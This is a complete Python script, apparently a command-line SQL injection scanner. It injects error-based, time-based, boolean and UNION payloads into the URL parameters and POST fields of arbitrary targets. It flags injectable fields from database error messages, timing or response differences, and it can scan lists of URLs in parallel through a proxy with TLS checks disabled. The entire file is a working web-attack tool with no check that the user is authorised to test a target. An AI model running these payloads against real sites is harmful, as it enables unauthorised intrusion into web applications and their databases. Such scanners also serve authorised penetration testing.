import requests
import re
import sys
import time
import argparse
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore, Style
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize colorama for colored output
init(autoreset=True)

class SQLInjectionScanner:
    def __init__(self, verbose=False, delay=0.5, timeout=10, proxy=None):
        self.verbose = verbose
        self.delay = delay
        self.timeout = timeout
        self.proxy = proxy
        self.session = requests.Session()
        self.session.verify = False
        
        if proxy:
            self.session.proxies = {
                'http': proxy,
                'https': proxy
            }
        
        self.results = []
        self.vulnerabilities = []
        
        # Common SQL injection payloads
        self.error_based_payloads = [
            "'",
            "\"",
            "')",
            "')--",
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR 1=1--",
            "') OR '1'='1'--",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND SLEEP(5)--",
            "' OR SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' OR 1=1#",
            "' OR 1=1/*",
        ]
        
        # Error patterns indicating SQL injection
        self.error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"MySqlException",
            r"ORA-[0-9]{5}",
            r"Oracle error",
            r"Oracle.*Driver",
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_.*",
            r"valid PostgreSQL result",
            r"SQLite/JDBCDriver",
            r"SQLite.Exception",
            r"System.Data.SQLite.SQLiteException",
            r"Warning.*sqlite_.*",
            r"valid SQLite",
            r"SQL Server.*Driver",
            r"SQL Server.*Exception",
            r"com.microsoft.sqlserver",
            r"Unclosed quotation mark",
            r"Microsoft OLE DB Provider for ODBC Drivers",
            r"Microsoft VBScript runtime error",
            r"Microsoft OLE DB Provider for SQL Server",
            r"Driver.*SQL Server",
            r"SQLServer JDBC Driver",
            r"com.jdbc",
            r"java.sql.SQLException",
            r"org.hibernate.exception",
            r"org.springframework.dao",
            r"DB2 SQL Error",
            r"DB2Exception",
            r"com.ibm.db2",
            r"Informix.*Exception",
            r"com.informix",
            r"Sybase.*Exception",
            r"com.sybase",
            r"PostgreSQL.*ERROR",
            r"org.postgresql",
            r"You have an error in your SQL syntax",
            r"division by zero",
            r"Column count doesn't match",
            r"Unknown column",
            r"Table doesn't exist",
            r"Database error",
            r"SQL command not properly ended",
            r"Invalid column name",
            r"Conversion failed",
            r"String or binary data would be truncated",
            r"Cannot insert duplicate",
            r"Violation of PRIMARY KEY",
            r"Foreign key constraint fails",
        ]
        
        # Time-based indicators
        self.time_based_indicators = [
            "SLEEP",
            "WAITFOR",
            "pg_sleep",
            "benchmark",
            "sleep(",
        ]
        
    def print_info(self, message):
        if self.verbose:
            print(f"{Fore.CYAN}[*] {message}")
    
    def print_success(self, message):
        print(f"{Fore.GREEN}[+] {message}")
    
    def print_error(self, message):
        print(f"{Fore.RED}[-] {message}")
    
    def print_warning(self, message):
        print(f"{Fore.YELLOW}[!] {message}")
    
    def print_result(self, message):
        print(f"{Fore.MAGENTA}[RESULT] {message}")
    
    def get_url_parameters(self, url):
        """Extract parameters from URL"""
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        return query_params
    
    def build_url(self, url, params):
        """Build URL with parameters"""
        parsed = urlparse(url)
        query = urlencode(params, doseq=True)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path, 
                          parsed.params, query, parsed.fragment))
    
    def send_request(self, url, method='GET', data=None, params=None):
        """Send HTTP request"""
        try:
            if method.upper() == 'GET':
                response = self.session.get(url, params=params, 
                                          timeout=self.timeout)
            else:
                response = self.session.post(url, data=data, 
                                           timeout=self.timeout)
            
            time.sleep(self.delay)  # Delay between requests
            return response
            
        except requests.exceptions.RequestException as e:
            self.print_error(f"Request failed: {e}")
            return None
    
    def check_error_based(self, url, param, payload):
        """Check for error-based SQL injection"""
        original_params = self.get_url_parameters(url)
        test_params = original_params.copy()
        test_params[param] = payload
        
        test_url = self.build_url(url, test_params)
        response = self.send_request(test_url)
        
        if not response:
            return False
        
        # Check for error patterns
        for pattern in self.error_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                return True
        
        return False
    
    def check_time_based(self, url, param, payload, delay_seconds=5):
        """Check for time-based SQL injection"""
        original_params = self.get_url_parameters(url)
        test_params = original_params.copy()
        test_params[param] = payload
        
        test_url = self.build_url(url, test_params)
        
        start_time = time.time()
        response = self.send_request(test_url)
        elapsed_time = time.time() - start_time
        
        if elapsed_time >= delay_seconds:
            return True
        
        return False
    
    def check_boolean_based(self, url, param, true_payload, false_payload):
        """Check for boolean-based SQL injection"""
        # Test with true condition
        original_params = self.get_url_parameters(url)
        
        test_params = original_params.copy()
        test_params[param] = true_payload
        true_url = self.build_url(url, test_params)
        true_response = self.send_request(true_url)
        
        if not true_response:
            return False
        
        # Test with false condition
        test_params = original_params.copy()
        test_params[param] = false_payload
        false_url = self.build_url(url, test_params)
        false_response = self.send_request(false_url)
        
        if not false_response:
            return False
        
        # Compare responses
        if len(true_response.text) != len(false_response.text):
            return True
        
        return False
    
    def scan_single_param(self, url, param):
        """Scan a single parameter for SQL injection"""
        self.print_info(f"Scanning parameter: {param}")
        
        vulnerabilities_found = []
        
        # Error-based testing
        self.print_info(f"Testing error-based injection on {param}")
        for payload in self.error_based_payloads[:10]:  # First 10 payloads
            if self.check_error_based(url, param, payload):
                vuln = {
                    'parameter': param,
                    'type': 'Error-based SQL Injection',
                    'payload': payload,
                    'url': url
                }
                vulnerabilities_found.append(vuln)
                self.print_success(f"Error-based vulnerability found in {param} with payload: {payload}")
                break
        
        # Time-based testing
        self.print_info(f"Testing time-based injection on {param}")
        time_payloads = [
            f"' OR SLEEP(5)--",
            f"' AND SLEEP(5)--",
            f"'; WAITFOR DELAY '0:0:5'--",
            f"' OR pg_sleep(5)--",
        ]
        
        for payload in time_payloads:
            if self.check_time_based(url, param, payload):
                vuln = {
                    'parameter': param,
                    'type': 'Time-based SQL Injection',
                    'payload': payload,
                    'url': url
                }
                vulnerabilities_found.append(vuln)
                self.print_success(f"Time-based vulnerability found in {param} with payload: {payload}")
                break
        
        # Boolean-based testing
        self.print_info(f"Testing boolean-based injection on {param}")
        if self.check_boolean_based(url, param, 
                                   f"' AND 1=1--", 
                                   f"' AND 1=2--"):
            vuln = {
                'parameter': param,
                'type': 'Boolean-based SQL Injection',
                'payload': "' AND 1=1--",
                'url': url
            }
            vulnerabilities_found.append(vuln)
            self.print_success(f"Boolean-based vulnerability found in {param}")
        
        # Union-based testing
        self.print_info(f"Testing union-based injection on {param}")
        union_payloads = [
            f"' UNION SELECT NULL--",
            f"' UNION SELECT NULL,NULL--",
            f"' UNION SELECT NULL,NULL,NULL--",
            f"' UNION SELECT 1,2,3--",
        ]
        
        for payload in union_payloads:
            original_params = self.get_url_parameters(url)
            test_params = original_params.copy()
            test_params[param] = payload
            test_url = self.build_url(url, test_params)
            
            response = self.send_request(test_url)
            if response and 'UNION' not in response.text:  # Basic check
                # Look for numbers or NULL values that might indicate injection
                if re.search(r'\b(1|2|3|NULL)\b', response.text):
                    vuln = {
                        'parameter': param,
                        'type': 'Union-based SQL Injection',
                        'payload': payload,
                        'url': url
                    }
                    vulnerabilities_found.append(vuln)
                    self.print_success(f"Union-based vulnerability found in {param}")
                    break
        
        return vulnerabilities_found
    
    def scan_url(self, url, params=None):
        """Scan a URL for SQL injection vulnerabilities"""
        self.print_info(f"Scanning URL: {url}")
        
        # Extract parameters from URL
        if not params:
            params = self.get_url_parameters(url)
            
            if not params:
                self.print_warning("No parameters found in URL")
                return []
        
        all_vulnerabilities = []
        
        # Scan each parameter
        for param in params.keys():
            vulns = self.scan_single_param(url, param)
            if vulns:
                all_vulnerabilities.extend(vulns)
                self.print_result(f"Vulnerability found in parameter: {param}")
        
        return all_vulnerabilities
    
    def scan_post_form(self, url, form_data):
        """Scan POST form data for SQL injection"""
        self.print_info(f"Scanning POST form: {url}")
        
        vulnerabilities = []
        
        for field in form_data.keys():
            self.print_info(f"Testing field: {field}")
            
            # Test different payloads on each field
            for payload in self.error_based_payloads[:10]:
                test_data = form_data.copy()
                test_data[field] = payload
                
                response = self.send_request(url, method='POST', data=test_data)
                
                if response:
                    for pattern in self.error_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            vuln = {
                                'parameter': field,
                                'type': 'Error-based SQL Injection',
                                'payload': payload,
                                'url': url,
                                'method': 'POST'
                            }
                            vulnerabilities.append(vuln)
                            self.print_success(f"POST SQL injection found in field: {field} with payload: {payload}")
                            break
        
        return vulnerabilities
    
    def scan_with_multithreading(self, urls, max_workers=10):
        """Scan multiple URLs with multithreading"""
        self.print_info(f"Starting multi-threaded scan with {max_workers} workers")
        
        all_results = []
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_url = {executor.submit(self.scan_url, url): url for url in urls}
            
            for future in as_completed(future_to_url):
                url = future_to_url[future]
                try:
                    result = future.result()
                    if result:
                        all_results.extend(result)
                        self.print_success(f"Found {len(result)} vulnerabilities in {url}")
                except Exception as e:
                    self.print_error(f"Error scanning {url}: {e}")
        
        return all_results
    
    def detect_db_type(self, url, param):
        """Attempt to detect database type"""
        db_indicators = {
            'MySQL': ['MySQL', 'mysql_', 'MySQLSyntaxErrorException'],
            'PostgreSQL': ['PostgreSQL', 'pg_', 'valid PostgreSQL'],
            'Oracle': ['ORA-', 'Oracle', 'oracle.jdbc'],
            'MSSQL': ['SQL Server', 'com.microsoft.sqlserver', 'Unclosed quotation'],
            'SQLite': ['SQLite', 'sqlite_'],
            'DB2': ['DB2', 'com.ibm.db2'],
        }
        
        detected = []
        
        for payload in self.error_based_payloads[:5]:
            original_params = self.get_url_parameters(url)
            test_params = original_params.copy()
            test_params[param] = payload
            test_url = self.build_url(url, test_params)
            
            response = self.send_request(test_url)
            if response:
                for db_type, indicators in db_indicators.items():
                    for indicator in indicators:
                        if indicator.lower() in response.text.lower():
                            detected.append(db_type)
        
        return list(set(detected))
    
    def generate_report(self, vulnerabilities):
        """Generate a detailed report of findings"""
        if not vulnerabilities:
            self.print_info("No vulnerabilities found")
            return
        
        print("\n" + "="*80)
        print(Fore.YELLOW + "SQL INJECTION VULNERABILITY REPORT")
        print("="*80)
        
        # Group by vulnerability type
        vuln_types = {}
        for vuln in vulnerabilities:
            vuln_type = vuln['type']
            if vuln_type not in vuln_types:
                vuln_types[vuln_type] = []
            vuln_types[vuln_type].append(vuln)
        
        # Display vulnerabilities by type
        for vuln_type, vulns in vuln_types.items():
            print(f"\n{Fore.CYAN}[*] {vuln_type} ({len(vulns)} found)")
            print("-"*50)
            
            for vuln in vulns:
                print(f"  URL: {vuln['url']}")
                print(f"  Parameter: {vuln['parameter']}")
                print(f"  Payload: {vuln['payload']}")
                if 'method' in vuln:
                    print(f"  Method: {vuln['method']}")
                print()
        
        print("="*80)
        print(f"Total vulnerabilities found: {len(vulnerabilities)}")
        print("="*80)
    
    def save_report(self, vulnerabilities, filename="sql_injection_report.txt"):
        """Save scan results to file"""
        with open(filename, 'w') as f:
            f.write("SQL INJECTION VULNERABILITY SCAN REPORT\n")
            f.write("="*60 + "\n")
            f.write(f"Scan Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("="*60 + "\n\n")
            
            if not vulnerabilities:
                f.write("No vulnerabilities found.\n")
                return
            
            # Group by vulnerability type
            vuln_types = {}
            for vuln in vulnerabilities:
                vuln_type = vuln['type']
                if vuln_type not in vuln_types:
                    vuln_types[vuln_type] = []
                vuln_types[vuln_type].append(vuln)
            
            for vuln_type, vulns in vuln_types.items():
                f.write(f"\n{vuln_type} ({len(vulns)} found)\n")
                f.write("-"*40 + "\n")
                
                for vuln in vulns:
                    f.write(f"URL: {vuln['url']}\n")
                    f.write(f"Parameter: {vuln['parameter']}\n")
                    f.write(f"Payload: {vuln['payload']}\n")
                    if 'method' in vuln:
                        f.write(f"Method: {vuln['method']}\n")
                    f.write("\n")
            
            f.write("\n" + "="*60 + "\n")
            f.write(f"Total vulnerabilities: {len(vulnerabilities)}\n")
        
        self.print_success(f"Report saved to {filename}")

def main():
    parser = argparse.ArgumentParser(
        description="SQL Injection Vulnerability Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Scan a single URL
  python sql_injection_scanner.py -u "http://example.com/page?id=1"
  
  # Scan with verbose output
  python sql_injection_scanner.py -u "http://example.com/page?id=1" -v
  
  # Scan a POST form
  python sql_injection_scanner.py -u "http://example.com/login" --post "username=admin&password=pass"
  
  # Scan multiple URLs from file
  python sql_injection_scanner.py -f urls.txt -t 20
  
  # Scan with custom timeout and delay
  python sql_injection_scanner.py -u "http://example.com/page?id=1" -to 15 -d 1
  
  # Scan with proxy
  python sql_injection_scanner.py -u "http://example.com/page?id=1" --proxy "http://127.0.0.1:8080"
        """
    )
    
    parser.add_argument('-u', '--url', help='Target URL to scan')
    parser.add_argument('-f', '--file', help='File containing list of URLs to scan')
    parser.add_argument('-p', '--post', help='POST data (format: param1=value1&param2=value2)')
    parser.add_argument('-t', '--threads', type=int, default=5, 
                       help='Number of threads for multi-threaded scanning (default: 5)')
    parser.add_argument('-to', '--timeout', type=int, default=10,
                       help='Request timeout in seconds (default: 10)')
    parser.add_argument('-d', '--delay', type=float, default=0.5,
                       help='Delay between requests in seconds (default: 0.5)')
    parser.add_argument('--proxy', help='Proxy server (e.g., http://127.0.0.1:8080)')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Enable verbose output')
    parser.add_argument('-o', '--output', help='Output report file (default: sql_injection_report.txt)')
    parser.add_argument('--no-color', action='store_true',
                       help='Disable colored output')
    
    args = parser.parse_args()
    
    if args.no_color:
        global Fore, Style
        Fore.GREEN = Fore.CYAN = Fore.RED = Fore.YELLOW = Fore.MAGENTA = Style.RESET_ALL = ''
    
    scanner = SQLInjectionScanner(
        verbose=args.verbose,
        delay=args.delay,
        timeout=args.timeout,
        proxy=args.proxy
    )
    
    print("="*60)
    print(Fore.YELLOW + "SQL INJECTION VULNERABILITY SCANNER")
    print("="*60)
    print(f"Start time: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print("="*60)
    
    vulnerabilities = []
    
    try:
        if args.url:
            # Single URL scan
            if args.post:
                # Parse POST data
                post_data = {}
                for item in args.post.split('&'):
                    if '=' in item:
                        key, value = item.split('=', 1)
                        post_data[key] = value
                
                scanner.print_info(f"Scanning POST form: {args.url}")
                vulnerabilities = scanner.scan_post_form(args.url, post_data)
            else:
                vulnerabilities = scanner.scan_url(args.url)
        
        elif args.file:
            # Scan multiple URLs from file
            with open(args.file, 'r') as f:
                urls = [line.strip() for line in f if line.strip()]
            
            scanner.print_info(f"Loaded {len(urls)} URLs from {args.file}")
            vulnerabilities = scanner.scan_with_multithreading(urls, args.threads)
        
        else:
            parser.print_help()
            sys.exit(1)
        
        # Generate report
        scanner.generate_report(vulnerabilities)
        
        # Save report if requested
        if args.output:
            scanner.save_report(vulnerabilities, args.output)
        elif vulnerabilities:
            save = input("\nSave report to file? (y/n): ").lower().strip()
            if save == 'y':
                filename = args.output or "sql_injection_report.txt"
                scanner.save_report(vulnerabilities, filename)
        
    except KeyboardInterrupt:
        print("\n\n[!] Scan interrupted by user")
        if vulnerabilities:
            scanner.generate_report(vulnerabilities)
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)
    
    print(f"\nEnd time: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print("="*60)

if __name__ == "__main__":
    main()